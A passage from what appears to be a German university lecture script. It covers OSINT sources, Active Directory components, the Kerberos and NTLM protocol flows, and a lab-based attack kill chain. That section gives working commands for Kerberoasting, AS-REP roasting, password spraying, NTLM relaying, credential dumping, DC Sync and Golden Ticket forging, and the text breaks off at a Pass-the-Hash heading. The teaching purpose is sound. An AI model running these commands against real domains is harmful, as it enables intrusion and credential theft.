- **Social Media**: Ein Großteil der öffentlich verfügbaren Informationen stammt aus sozialen Netzwerken. Plattformen wie Facebook, LinkedIn, Twitter oder Instagram bieten eine Vielzahl von Datenpunkten, die auf Profilinformationen, Beiträge, Kommentare und soziale Interaktionen basieren. Hier lassen sich sowohl aktuelle Ereignisse als auch persönliche Interessen, berufliche Verbindungen und Netzwerke nachvollziehen. Diese Daten können dazu verwendet werden, ein umfassendes Bild von Zielpersonen zu erstellen, das sowohl berufliche als auch private Aspekte einschließt.

- **Datenbanken**: Eine weitere wichtige Quelle für OSINT sind durchgesickerte Datenbanken. Zugangsdaten-Leaks, kompromittierte Cloud-Speicher und ähnliche Quellen bieten oftmals wertvolle Informationen – beispielsweise kompromittierte Benutzerkonten, die zu weiteren Angriffen missbraucht werden könnten, oder Informationen über die verwendeten Sicherheitsmechanismen einer Organisation. Diese Informationen stammen häufig aus Hackerforen oder einschlägigen Darknet-Marktplätzen und stellen eine ernste Bedrohung dar, wenn sie in die falschen Hände gelangen.

- **Sonstige Websites**: Hierzu gehören zahlreiche andere Informationsquellen, darunter **Foren**, **Nachrichtenportale**, **APIs**, **Videos/TV** und **KI-basierte Inhalte**. Foren, etwa im Darknet oder spezialisierte technische Plattformen, können wichtige Hintergrundinformationen bieten. APIs bieten automatisierte Zugänge zu umfangreichen Datensätzen, die anderenfalls nicht systematisch durchsuchbar wären. Auch Medienquellen, sei es in Form von Nachrichtenportalen oder TV-Sendungen, können wichtige kontextuelle Informationen zu aktuellen Ereignissen liefern, die für eine vollständige OSINT-Analyse unerlässlich sind.


### Social Media

- **Fragen zur Selbstreflexion**: Wie viele Profile haben Sie? Kennen Sie alle veröffentlichten Informationen? Ist Ihnen Ihre Privatsphäre wichtig?

Auf Social Media teilen wir wissentlich oder unwissentlich eine Vielzahl an Datenpunkten – von Namen und Beziehungsstatus bis hin zu Fitnessaktivitäten und Aufenthaltsorten. Je aktiver man ist, desto mehr Informationen werden veröffentlicht, die potenziell für OSINT genutzt werden können.

Social Media bietet zudem die Möglichkeit, über die Aktivitäten, die eine Person ausführt, Rückschlüsse auf Gewohnheiten, Vorlieben und Netzwerke zu ziehen. Dies ermöglicht eine detaillierte Analyse des Verhaltens und der sozialen Kreise einer Person.


### Versteckte Daten und Netzwerke

- **Versteckte Daten**: Bilder enthalten oft Metadaten wie Geolokation, Zeitstempel oder Geräteinformationen, die wertvolle Hinweise liefern können. Diese Informationen können genutzt werden, um den Ursprung eines Bildes zu bestimmen oder um Bewegungsmuster der Zielperson zu identifizieren.
- **Netzwerke**: Social Media Plattformen ermöglichen nicht nur das Teilen persönlicher Informationen, sondern auch den Aufbau von Verbindungen zwischen Nutzern, wie z. B. Freundschaften oder Abonnements. Diese Verbindungen bilden häufig Communities, die Zugehörigkeiten, Freundes- und Bekanntenkreise widerspiegeln, ähnlich den sozialen Netzwerken im echten Leben. Solche Informationen können genutzt werden, um nicht nur das Verhalten einzelner Personen zu analysieren, sondern auch um Verbindungen zu erkennen, die für die Identifizierung von Terror- oder kriminellen Netzwerken von Bedeutung sein könnten. Diese Netzwerke liefern wertvolle Einblicke in die sozialen Strukturen und möglichen Kontakte einer Zielperson, was besonders für die Strafverfolgung und die Gefahrenabwehr von Interesse ist


### KI und Maschinelles Lernen

Große Textdatensätze, wie Chatnachrichten, sind für menschliche Analysten oft zu umfangreich. **Machine Learning** hilft dabei, diese Daten zu verarbeiten und Personenprofile zu erstellen. Moderne Modelle können sogar die Kommunikation der Zielperson nachahmen, indem sie auf der Basis unzähliger gesammelter Nachrichten trainiert werden.

Mit maschinellem Lernen können Verhaltensmuster erkannt und große Datenmengen effizient ausgewertet werden. Dies ermöglicht es, Anomalien zu entdecken, Netzwerke zu visualisieren oder spezifische Interessensgebiete einer Zielperson zu identifizieren.

### Datenbanken

- **Leaked-Datenbanken**: Speichern Zugangsdaten, die durch Schwachstellen geleakt wurden. Diese Datenbanken sind oft im Darknet verfügbar und bieten eine große Menge an kompromittierten Informationen, die für OSINT genutzt werden können.
- **Cloud-Datenbanken**: Indexieren versehentlich veröffentlichte Dateien. Cloud-Dienste wie AWS oder Google Cloud haben immer wieder Sicherheitslücken, durch die Dateien unbeabsichtigt öffentlich werden. Diese können durch gezielte Suchtechniken gefunden und analysiert werden.
- **Favicons**: Können genutzt werden, um spezifische Webanwendungen zu identifizieren, die ein bestimmtes Favicon nutzen. Diese scheinbar harmlosen Datenpunkte können Rückschlüsse auf verwendete Technologien und damit auf potenzielle Schwachstellen geben.
- **Code-Datenbanken**: **Github** und ähnliche Plattformen können durch Abfragen durchsucht werden, um geleakte Informationen oder Sicherheitslücken zu finden. Oftmals werden versehentlich Zugangsdaten, API-Schlüssel oder vertrauliche Informationen in Code-Repositorys hochgeladen. Diese können von Angreifern genutzt werden, um Schwachstellen zu identifizieren.

### Vorsicht vor Rabbit Holes!

Bei der Informationssuche besteht die Gefahr, dass man **falsche Annahmen trifft** und sich in sogenannte "Rabbit Holes" verirrt – eine Reihe falscher Verknüpfungen, die die gesamte Recherche beeinflussen.

Es ist daher wichtig, sich regelmäßig zu hinterfragen und zu überprüfen, ob alle Informationen noch stimmig sind. Das Entwickeln von Mechanismen zur **Qualitätsüberprüfung** der Daten kann helfen, den Fokus auf die wesentlichen und verlässlichen Informationen zu behalten. Systeme zur Klassifizierung von Informationsquellen nach ihrer Vertrauenswürdigkeit sind ebenfalls hilfreich, um eine fundierte Entscheidung zu treffen und die Validität der gesammelten Daten sicherzustellen.

# Active Directory

Active Directory ist ein von Microsoft entwickelter Verzeichnisdienst, der eine zentrale Verwaltung von IT-Infrastrukturen und -Systemen ermöglicht. Die Notwendigkeit für eine solche Lösung entstand in den 1990er Jahren, als das rasante Wachstum von IT-Netzwerken die dezentrale Verwaltung von Geräten und Benutzern immer aufwendiger machte. Das ursprüngliche Modell skalierte nicht effizient, was dazu führte, dass IT-Administratoren jeden PC einzeln konfigurieren und verwalten mussten. Um dieses Problem zu lösen, entwickelte Microsoft Active Directory.

Die Grundlage für Active Directory bildete zunächst Microsoft Exchange. Die Idee war, das bereits etablierte Rechte- und Rollenkonzept von Exchange zu nutzen und es für die zentrale Verwaltung aller Windows-PCs zu erweitern.

## Komponenten von Active Directory

Active Directory (AD) ist ein zentraler Verzeichnisdienst, der in einer Vielzahl von Unternehmensnetzwerken weltweit eingesetzt wird. Er basiert auf einer Kombination verschiedener Protokolle und Technologien, die zusammen die Verwaltung von Ressourcen und Benutzern innerhalb eines Netzwerks effizient und sicher machen. AD stellt sicher, dass Administratoren Benutzer, Geräte, Richtlinien und Berechtigungen zentral verwalten können. Zu den wichtigsten Komponenten von Active Directory gehören:

- **Kerberos**: Kerberos ist das primäre Authentifizierungsprotokoll in Active Directory. Es handelt sich um ein Netzwerk-Authentifizierungsprotokoll, das symmetrische Verschlüsselung und vertrauenswürdige Drittparteien verwendet. Kerberos wurde speziell entwickelt, um sichere Anmeldevorgänge in einer Client-Server-Umgebung zu ermöglichen. Im Active Directory-Umfeld spielt Kerberos eine entscheidende Rolle, indem es sicherstellt, dass Benutzer und Dienste ihre Identität authentifizieren können, ohne Passwörter über das Netzwerk zu senden. Dies bietet einen hohen Sicherheitsstandard und minimiert das Risiko von Man-in-the-Middle-Angriffen.

- **LDAP (Lightweight Directory Access Protocol)**: LDAP ist ein Protokoll für den Zugriff auf und die Verwaltung von Verzeichnisdiensten. In Active Directory wird LDAP verwendet, um die Abfragen von Verzeichnisinformationen wie Benutzerkonten, Gruppen oder Computern zu ermöglichen. Es ermöglicht Basisfunktionen wie Login, Suche, Hinzufügen, Löschen und Ändern von Einträgen im Verzeichnis. LDAP dient als wichtige Schnittstelle für die Kommunikation zwischen Anwendungen und dem Verzeichnisdienst, wodurch eine flexible Verwaltung möglich ist. LDAP arbeitet über das TCP/IP-Protokoll und nutzt in der Regel Port 389 oder für gesicherte Kommunikation LDAPS über Port 636.

- **DNS (Domain Name System)**: DNS ist ein unverzichtbarer Bestandteil von Active Directory, da es die Namensauflösung innerhalb des Netzwerks übernimmt. Da AD auf einem hierarchischen Domänenmodell basiert, spielt DNS eine Schlüsselrolle, um sicherzustellen, dass Clients und Server im Netzwerk ordnungsgemäß miteinander kommunizieren können. Es übersetzt Hostnamen in IP-Adressen und ermöglicht somit die Erreichbarkeit von Ressourcen im Netzwerk. In AD ist DNS eng integriert und unterstützt Funktionen wie Service Locator Records (SRV-Records), die essenziell sind, damit Clients die nächsten Verzeichnisdienste finden können.

- **SMB (Server Message Block)**: SMB ist ein Protokoll, das den Datenaustausch zwischen Geräten innerhalb eines Netzwerks regelt. Es ermöglicht den Zugriff auf freigegebene Dateien, Ordner und Drucker. Innerhalb von Active Directory spielt SMB eine wichtige Rolle, um Netzwerkressourcen für Benutzer bereitzustellen und die gemeinsame Nutzung von Daten und Druckern zu erleichtern. Das SMB-Protokoll ermöglicht es beispielsweise, dass Benutzer problemlos auf freigegebene Ordner auf Dateiservern zugreifen können, die in das AD integriert sind.

- **Group Policy**: Eine weitere entscheidende Komponente von Active Directory ist die Verwaltung von Gruppenrichtlinien (Group Policy). Group Policies bieten Administratoren die Möglichkeit, Einstellungen für Benutzer und Computer zentral zu verwalten und Sicherheitsrichtlinien durchzusetzen. Diese Richtlinien können nahezu alle Aspekte des Betriebssystems abdecken, wie z. B. Softwareinstallationen, Netzwerkkonfigurationen oder Sicherheitsvorgaben. Group Policies werden in Active Directory durch organisatorische Einheiten (OUs) strukturiert und erleichtern die Administration größerer IT-Infrastrukturen erheblich.

- **Replication und Domain Controller**: Active Directory ist für seine Fähigkeit bekannt, die Verzeichnisinformationen über mehrere Standorte hinweg zu replizieren. Diese Replikation wird zwischen den sogenannten Domain Controllern (DCs) durchgeführt. Domain Controller sind Server, die die Active Directory-Datenbank hosten und authentifizieren können. Die Replikation stellt sicher, dass alle DCs auf dem neuesten Stand sind, sodass die Verfügbarkeit und Konsistenz der Verzeichnisdaten über das gesamte Netzwerk hinweg gewährleistet ist.

Diese Komponenten sind eng miteinander verflochten und werden durch die sogenannte "Microsoft Magic" miteinander verbunden, was eine nahtlose Integration und Verwaltung ermöglicht. Die grafische Benutzeroberfläche (GUI) von Active Directory macht es Administratoren leicht, all diese komplexen Technologien zu verwalten und zu steuern, ohne tief in die technischen Details der Protokolle eintauchen zu müssen. Die Kombination dieser Technologien und Protokolle macht Active Directory zu einem leistungsstarken und gleichzeitig benutzerfreundlichen Werkzeug für die zentrale Verwaltung von Netzwerken in Unternehmen.



## Architektur von Active Directory

Technisch gesehen besteht Active Directory aus mehreren zentralen Elementen:

- **Domänencontroller**: Windows Server, die zu Domänencontrollern ernannt werden, verwalten die Domäne und steuern deren Betrieb. Sie aktivieren Dienste wie den Key Distribution Center (KDC), AD-Domänendienst, DNS, Sicherheitskonten-Manager und die Ntds.dit-Datenbank.
- **Domänen und Forests**: Eine Domäne ist eine logische Gruppierung von Objekten. Domänen können in einem Forest zusammengefasst werden, um Vertrauensstellungen und die gemeinsame Nutzung von Ressourcen zu ermöglichen.
- **Objekte und OUs**: Jedes Element in Active Directory, von Computern und Benutzern bis hin zu Gruppen und Druckern, ist als Objekt repräsentiert. Diese Objekte können über Sites und Organizational Units (OUs) gruppiert werden.
- **Gruppenrichtlinienobjekte (GPOs)**: Diese bieten eine Möglichkeit zur zentralen Konfiguration von Systemen in der Domäne über eine GUI.

## Authentifizierung in Active Directory

Für die Authentifizierung innerhalb von Active Directory werden zwei Protokolle verwendet:

- **NTLM**: Ein Stateless-Protokoll mit Challenge-Response-Verfahren, das jedoch anfällig für Pass-the-Hash-Angriffe ist.
- **Kerberos**: Ein Ticket-basiertes Protokoll, das vom Domänencontroller gehandhabt wird und sicherer gegen Relay-Angriffe ist.

### Kerberos-Protokollablauf

Das Kerberos-Protokoll ist ein zentraler Bestandteil der Authentifizierung in vielen Netzwerken, insbesondere in Active Directory-Umgebungen. Es basiert auf einem Ticket-basierten System und verwendet kryptografische Schlüssel, um eine sichere Authentifizierung zwischen Clients und Diensten zu gewährleisten. Das Protokoll besteht aus drei Hauptentitäten: dem Client, dem Key Distribution Center (KDC), und den Diensten, auf die der Benutzer zugreifen möchte. Der KDC selbst ist weiter in zwei Teile untergliedert: den **Authentication Service (AS)** und den **Ticket Granting Service (TGS)**.

![image](https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/Kerberos_protocol.svg/645px-Kerberos_protocol.svg.png)

Im Folgenden wird der detaillierte Ablauf beschrieben:

1. **AS-REQ (Authentication Service Request)**: Der Benutzer, der sich am Netzwerk anmelden möchte, sendet eine Anfrage an den KDC. Diese Anfrage enthält den Benutzernamen und einen Authenticator, der mit dem Geheimschlüssel des Benutzers verschlüsselt ist. Dieser Authenticator besteht aus einem Zeitstempel und wird genutzt, um Replay-Angriffe zu verhindern.

2. **AS-REP (Authentication Service Response)**: Der KDC überprüft die Anfrage und stellt sicher, dass der Benutzer berechtigt ist, ein Ticket zu erhalten. Wenn die Anfrage gültig ist, sendet der KDC ein **Ticket Granting Ticket (TGT)** zurück. Dieses TGT ist mit dem geheimen Schlüssel des KDC verschlüsselt und enthält einen Session Key, der zur Kommunikation zwischen dem Benutzer und dem KDC verwendet wird. Außerdem wird der Session Key an den Benutzer zurückgesendet, jedoch mit dem geheimen Schlüssel des Benutzers verschlüsselt.

3. **TGS-REQ (Ticket-Granting Service Request)**: Wenn der Benutzer auf einen bestimmten Dienst zugreifen möchte, sendet er eine Anfrage an den Ticket Granting Service (TGS). Diese Anfrage beinhaltet das zuvor erhaltene TGT sowie einen neuen Authenticator, der mit dem Session Key verschlüsselt wurde. Dieser Schritt dient dazu, die Identität des Benutzers zu authentifizieren und sicherzustellen, dass das TGT noch gültig ist.

4. **TGS-REP (Ticket-Granting Service Response)**: Der TGS prüft das TGT und den Authenticator. Wenn beide als gültig erkannt werden, erstellt der TGS ein **Service Ticket**. Dieses Service Ticket ist für den spezifischen Dienst bestimmt, auf den der Benutzer zugreifen möchte, und wird sowohl an den Benutzer als auch an den Service verschlüsselt weitergegeben.

5. **AP-REQ (Application Request)**: Der Benutzer sendet das erhaltene Service Ticket an den gewünschten Dienst. Dieser Schritt wird als **Application Request** bezeichnet und enthält das Service Ticket sowie einen weiteren Authenticator, der mit dem Session Key verschlüsselt ist. Das Service Ticket dient als Nachweis dafür, dass der Benutzer berechtigt ist, auf den Dienst zuzugreifen.

6. **AP-REP (Application Response)**: Der angefragte Dienst prüft das Service Ticket und den Authenticator. Wenn beide erfolgreich verifiziert werden, wird der Zugriff gewährt. Optional kann der Dienst eine Antwort an den Benutzer zurücksenden, um die erfolgreiche Authentifizierung zu bestätigen.

### Schlüssel und Tickets im Kerberos-Protokoll

- **Geheimer Benutzer-Schlüssel**: Wird verwendet, um den Authenticator zu verschlüsseln, den der Benutzer an den KDC sendet.
- **Session Key**: Ein temporärer Schlüssel, der zwischen dem Benutzer und dem KDC sowie zwischen dem Benutzer und dem Dienst verwendet wird, um die Kommunikation zu sichern.
- **Ticket Granting Ticket (TGT)**: Ein Ticket, das dem Benutzer den Zugang zu weiteren Diensten über den TGS ermöglicht, ohne dass das Passwort erneut eingegeben werden muss.
- **Service Ticket**: Ein Ticket, das dem Benutzer den Zugang zu einem spezifischen Dienst ermöglicht.

### Sicherheit im Kerberos-Protokoll

Das Kerberos-Protokoll stellt sicher, dass die Anmeldeinformationen des Benutzers nicht im Klartext über das Netzwerk übertragen werden, wodurch es gegen Abhörangriffe resistent ist. Die Verwendung von Zeitstempeln in den Authenticators schützt zusätzlich vor Replay-Angriffen. Der Einsatz von symmetrischen Verschlüsselungstechniken sorgt dafür, dass nur autorisierte Parteien auf die Schlüssel und Tickets zugreifen können.

### NTLM-Protokollablauf

Das NTLM (NT LAN Manager) Protokoll ist ein Authentifizierungsprotokoll, das ursprünglich von Microsoft entwickelt wurde und immer noch in vielen Legacy-Systemen und Umgebungen, die keine Kerberos-Unterstützung haben, verwendet wird. NTLM basiert auf einem Challenge-Response-Mechanismus, um die Identität von Benutzern zu verifizieren, ohne das Passwort im Klartext über das Netzwerk zu senden. Der Ablauf besteht aus mehreren Schritten zwischen dem Client, dem Server und dem Domain Controller (falls vorhanden).

Im Folgenden wird der detaillierte Ablauf beschrieben:

1. **Negotiate Message**: Der Client, der sich gegenüber einem Server authentifizieren möchte, sendet eine **Negotiate Message** an den Server. Diese Nachricht enthält Informationen über die vom Client unterstützten NTLM-Funktionen und verschlüsselte Daten, die die Authentifizierung erleichtern sollen.

2. **Challenge Message**: Der Server empfängt die Negotiate Message und antwortet mit einer **Challenge Message**. Diese Nachricht enthält eine **Server Challenge**, die als zufällige Zahl (Nonce) generiert wird. Diese Challenge wird verwendet, um sicherzustellen, dass die Authentifizierung sicher erfolgt und nicht durch Replay-Angriffe kompromittiert werden kann.

3. **Authenticate Message**: Der Client empfängt die Challenge und berechnet eine **Response**, die auf der Challenge sowie auf einem Hash des Benutzerpassworts basiert. Der Hash wird durch den NTLM Hashing-Algorithmus generiert, wobei das Benutzerpasswort niemals im Klartext übertragen wird. Diese berechnete Antwort wird dann in der **Authenticate Message** an den Server gesendet.

4. **Verifikation und Zugriff**: Der Server prüft die Antwort des Clients, indem er eine eigene Version der Response basierend auf den ihm bekannten Benutzerinformationen und der Challenge berechnet. Wenn die vom Client gesendete Antwort und die vom Server berechnete Antwort übereinstimmen, ist die Authentifizierung erfolgreich und der Zugriff wird gewährt.

Optional kann der Server, falls er Teil einer Domäne ist, die Authentifizierungsinformationen an den **Domain Controller** weiterleiten, um die Anmeldeinformationen zu verifizieren. Der Domain Controller berechnet ebenfalls die Challenge-Response und bestätigt oder verweigert die Authentifizierung.

Der NTLM-Protokollablauf kann folgendermaßen zusammengefasst werden:

1. **Client → Server**: Negotiate Message
2. **Server → Client**: Challenge Message (enthält Nonce)
3. **Client → Server**: Authenticate Message (enthält Challenge Response)
4. **Server**: Verifikation der Antwort und Entscheidung über Zugriff

NTLM ist zwar weniger sicher als Kerberos, da es anfällig für Angriffe wie Pass-the-Hash ist, wird aber in bestimmten Szenarien noch immer eingesetzt, insbesondere wenn Kompatibilität zu älteren Systemen notwendig ist.


## Angriffe auf Active Directory

Obwohl Active Directory ein robustes System ist, gibt es verschiedene Angriffsvektoren, die von Angreifern ausgenutzt werden können. Diese reichen von **Kerberoasting** über **Golden und Silver Tickets** bis hin zu **Pass-the-Hash-Angriffen**. Es ist wichtig, zwischen **Abuses** und **Exploits** zu unterscheiden:

- **Abuses**: Nutzung bestehender Funktionen für schädliche Zwecke.
- **Exploits**: Ausnutzen von Sicherheitslücken, die durch Patches behoben werden können.

Exploits können durch Patches behoben werden, Abuses erfordern jedoch oft komplexere Maßnahmen, da sie die Funktionalität des Systems selbst betreffen.

## Toolliste

1. **Impacket** - Sammlung von Python-Klassen für Netzwerkprotokolle, häufig verwendet für Angriffe im Windows-Umfeld.
2. **Rubeus** - Ein Tool zur Interaktion mit Kerberos-Tickets, nützlich für Credential Theft.
3. **Lsassy** - Automatisiert das Auslesen von Passwörtern und Hashes aus dem LSASS-Prozess.
4. **Mimikatz** - Bekanntes Tool zum Extrahieren von Anmeldeinformationen aus dem Speicher, Dumping von Passwort-Hashes, Kerberos-Tickets usw.
5. **Bloodhound** - Tool zur Visualisierung und Analyse von Active Directory Rechten und Angriffswegen.
6. **Hashcat** - Leistungsfähiges Passwort-Cracking-Tool, unterstützt viele Hash-Typen.
7. **NetExec** - Führt Befehle auf entfernten Windows-Hosts aus.
8. **Responder** - LLMNR, NBT-NS und MDNS Poisoner, verwendet für Man-in-the-Middle-Angriffe im lokalen Netzwerk.
10. **evil-winrm** - Windows Remote Management (WinRM) Shell, häufig genutzt für die Post-Exploitation.

## Zwischenfazit

Im Alltag dient Active Directory zur Authentifizierung von Benutzern und Admins gegenüber Objekten, Systemen und der Domäne selbst. Dies geschieht über die Protokolle **Kerberos** und **NTLM**. DNS-Anfragen werden über Active Directory abgewickelt, um die richtigen Systeme zu finden und Load Balancing zu ermöglichen. Das Directory dient auch zur zentralen Speicherung und zum Abruf von Informationen. Die Konfiguration des gesamten Systems erfolgt zentral und kann durch **GPOs** automatisiert und an einzelne Gruppen oder Benutzer angepasst werden.

# Angriffsszenario gegen Active Directory

In diesem Abschnitt der Vorlesung werden beispielhafte Angriffe gegen Active Directory dargestellt, die als eine potenzielle Kill Chain beschrieben werden. Die Reihenfolge der Schritte kann dabei variieren oder wiederholt werden. Die vorgestellten Angriffe sind nur ein kleiner Ausschnitt aus dem breiten Spektrum an möglichen Angriffen.


## 1. Lokale Privilegieneskalation
Der erste Schritt einer solchen Kill Chain ist oft die lokale Privilegieneskalation, um lokale Administratorrechte zu erlangen. Dies kann auf verschiedene Weise erfolgen, wobei Tools wie **WinPEAS** zur automatisierten Prüfung genutzt werden. Zwei wichtige Methoden sind:

- **Unquoted Service Paths**: Bei einigen Diensten kann der Pfad zur ausführbaren Datei Leerzeichen enthalten. Durch die Art, wie Windows die Suchreihenfolge bei der Pfadangabe handhabt, kann der Angreifer eine eigene Datei erstellen, die anstelle der eigentlichen Datei vom Dienst ausgeführt wird. Dieser Dienst läuft typischerweise mit hohen Rechten.

- **Modifiable Service Files**: Hierbei wird die Datei, die von einem Dienst ausgeführt wird, durch eine manipulierte Version ersetzt, die dem Angreifer Administratorrechte oder eine Shell mit höheren Rechten verschafft.

```shell
. .\PowerUp.ps1

Invoke-AllChecks
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose

Invoke-ServiceAbuse -Name 'SNMPTTRAP' -UserName 'dcorp\student454'
```

## 2. Netzwerkaufklärung (Enumeration)
Nach der lokalen Privilegieneskalation erfolgt die Netzwerkaufklärung. Ein allgemeiner Scan, z.B. mit **nmap**, dient dazu, vorhandene Dienste und Geräte im Netzwerk zu identifizieren. Weitere Informationen über das Active Directory, wie z.B. den Domänencontroller, Child Domains oder andere Dienste, können ebenfalls gesammelt werden.

Zusätzlich kann eine **Interaktion über SMB** erfolgen. Da Active Directory oft mit SMB arbeitet, können hier Informationen über Geräte und Domänen gesammelt werden. Mit **enum4linux** lassen sich neben Benutzerlisten auch Gruppen und Passwortrichtlinien ermitteln.

Falls anonyme Abfragen nicht möglich sind, kann **Brute-Forcing** verwendet werden, um valide Benutzernamen zu identifizieren. Oftmals ermöglichen schlecht konfigurierte Shares eine anonyme Auflistung von Dateien, die sensible Informationen enthalten können.
```shell
# NMAP Scan
nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10-12,22-23

nxc smb 192.168.56.1/24

enum4linux 192.168.56.11
```

## 3. AS-REP Roasting
Beim **AS-REP Roasting** wird ein Ticket Granting Ticket (TGT) ohne vorherige Authentifizierung angefordert, was aus Kompatibilitätsgründen von Microsoft ermöglicht wurde. Der verschlüsselte Session Key im TGT kann mit Tools wie **Hashcat** geknackt werden, um das Benutzerpasswort herauszufinden.
```shell
GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt

hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt
```

## 4. Password Spraying
**Password Spraying** ist besonders effektiv gegen Active Directory, da normale Benutzerkonten oft schwache Passwörter verwenden. Hierbei wird ein Passwort für alle Benutzer getestet, wodurch die Lockout-Mechanismen umgangen werden. Häufig wird die Kombination **Passwort = Benutzername** verwendet, oder typische Passwörter wie "Sommer25!" oder "Welcome1!".

```shell
nxc smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce

sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2
```

## 5. Bloodhound
Bei großen Active Directory-Instanzen bietet sich **Bloodhound** an, um die vielen Informationen aus der Enumeration effizient zu verarbeiten. Mit dem Tool **SharpHound** werden Daten gesammelt, die dann in **Bloodhound** importiert und visualisiert werden. So lassen sich Angriffswege im Active Directory identifizieren.

- **Datensammlung durch SharpHound**:
  - Direkt vom Domänencontroller: Informationen über Gruppen, Trusts und Benutzer werden abgefragt.
  - Von einzelnen PCs: Hierbei werden Informationen zu lokalen Administrationsrechten und Anmeldungen gesammelt.

```powershell
xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore

.\sharphound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
.\sharphound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
.\sharphound.exe -d essos.local -c all --zipfilename bh_essos.zip

```

## 6. Kerberoasting
Verfügt der Angreifer über ein gültiges Benutzerkonto, kann **Kerberoasting** durchgeführt werden. Hierbei wird ein Ticket Granting Service (TGS) angefordert, das mit dem Passwort des Dienstes verschlüsselt ist. Der Angriff erfolgt offline und bleibt oft unbemerkt.

```shell
GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes

nxc ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING

hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```

## 7. Enumeration von Shares mit Credentials
Nachdem Zugangsdaten erlangt wurden, sollten **Shares erneut** auf Zugriffsrechte und sensible Dateien untersucht werden, da diese wertvolle Informationen enthalten können.

```shell
nxc smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares
```

## 8. Broadcast Poisoning
**Broadcast Poisoning** nutzt aus, dass Windows-Geräte verschiedene Broadcasts senden, z.B. zur Namensauflösung über den **NetBIOS Name Service (NBT-NS)**. Der Angreifer kann diese Broadcasts abfangen und mit gefälschten Antworten reagieren, um **NTLM-Anmeldeinformationen** zu erlangen.

```shell
responder -I eth0

hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt 
```

## 9. NTLM Relaying
Wenn **SMB Signing** deaktiviert ist, können Anfragen abgefangen und an andere Server weitergeleitet werden. Der Angreifer agiert als Vermittler und baut im Namen des Clients eine Session auf.

```shell
cme smb 192.168.56.10-23 --gen-relay-list relay.txt

sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='

ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks
responder -I eth0
```

## 10. Credential Dumping
Mit **Credential Dumping** werden Keys und Tickets, die auf einem PC gespeichert sind, extrahiert. Tools wie **Mimikatz** oder **LaZagne** können dazu verwendet werden. Auch ohne lokale Administratorrechte können gespeicherte Passwörter, z.B. aus **Chrome**, mit Tools wie **DonPapi** extrahiert werden.

Credential Dumping kann mit **NTLM Relaying** kombiniert werden, um automatisiert Credentials von verschiedenen Systemen zu erhalten, was zu einem Totalausfall des Active Directory führen kann.

```shell
python3 secretsdump.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 

lsassy -d north.sevenkingdoms.local -u jeor.mormont -p _L0ngCl@w_ 192.168.56.22 -m dumpertdll -O dumpertdll_path=/workspace/Outflank-Dumpert-DLL.dll
```
## 11. DC Sync
**DC Sync** ist eine Technik, bei der ein Angreifer die Funktionalität der Active Directory-Replikation ausnutzt, um Anmeldeinformationen direkt von einem Domain Controller zu extrahieren. Ein Angreifer, der über ausreichende Rechte (z.B. replizierende Directory-Änderungen) verfügt, kann die Datenbank des Domain Controllers nachbilden, einschließlich aller Passwort-Hashes. Tools wie **Mimikatz** ermöglichen es, diese Informationen abzufragen und somit Zugang zu hochprivilegierten Accounts, einschließlich des Domain Admins, zu erhalten. Dies macht DC Sync zu einem äußerst gefährlichen Angriff, der das gesamte Netzwerk kompromittieren kann.
```shell
secretsdump -just-dc-ntlm essos.local/Username:Password@meereen.essos.local
```

## 12. Golden Ticket Angriff
Ein **Golden Ticket Angriff** nutzt eine Schwachstelle in der Kerberos-Authentifizierung aus. Angreifer, die Zugriff auf den **KRBTGT**-Account im Active Directory erlangt haben, können **Golden Tickets** erstellen, die uneingeschränkten Zugriff auf alle Ressourcen der Domäne ermöglichen. Der **KRBTGT**-Account ist der Account, den der Key Distribution Center (KDC) verwendet, um TGTs zu verschlüsseln. Da der Angreifer in der Lage ist, eigene Tickets zu erstellen, kann er beliebige Rechte und sogar Administratorzugriff auf das gesamte Netzwerk erhalten. Solche Tickets sind schwer zu erkennen und ermöglichen es dem Angreifer, langfristig im Netzwerk präsent zu bleiben.
```shell
kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt


ticketer.py -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local Administrator
```

## 13. Lateral Movement
Das Ziel des Angreifers ist es oft, sich im Netzwerk weiter zu bewegen, um schließlich privilegierte Systeme oder Konten zu kompromittieren. **Lateral Movement** kann durch verschiedene Techniken erreicht werden, wie z.B. **Pass-the-Hash**, **Pass-the-Ticket** oder **Overpass-the-Hash**. Dabei wird oft auf Werkzeuge wie **PsExec** oder **WMIC** zurückgegriffen, um Remotezugriff zu erlangen. Ziel ist es, Zugang zu weiteren Systemen zu erhalten und schrittweise die Berechtigungen zu erhöhen.

### Pass-the-Hash Angriff
